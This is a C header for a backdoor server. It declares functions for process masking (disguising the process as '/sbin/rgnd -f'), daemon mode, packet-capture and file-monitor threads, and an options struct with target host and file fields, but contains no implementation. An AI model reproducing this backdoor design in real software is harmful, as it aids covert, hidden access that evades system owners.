#ifndef BACKDOOR_SERVER_H
#define BACKDOOR_SERVER_H

#include "utils.h"
#include "pktcap.h"

#define MASK_NAME "/sbin/rgnd -f"
#define DEFAULT_PORT 8080
#define TRUE 1
#define FALSE 0
#define USER_ROOT 0



struct options
{
	char * configFile;
	int daemon_mode;
	int listen_port;
	int protocol;
	const char * target_file;
	const char * src_host;
	const char * target_host;
	const char * mask_name;
	int target_port;
	struct filelist file_list;

} user_options;

int start_server();
int parse_options(int argc, char **argv);
void print_server_info();
void mask_process(char **argv);
int start_daemon();
void* fileMonitorThread(void* args);
int parse_config_file(char * config_file_name);
void * packetCapThread(void * args);

#endif
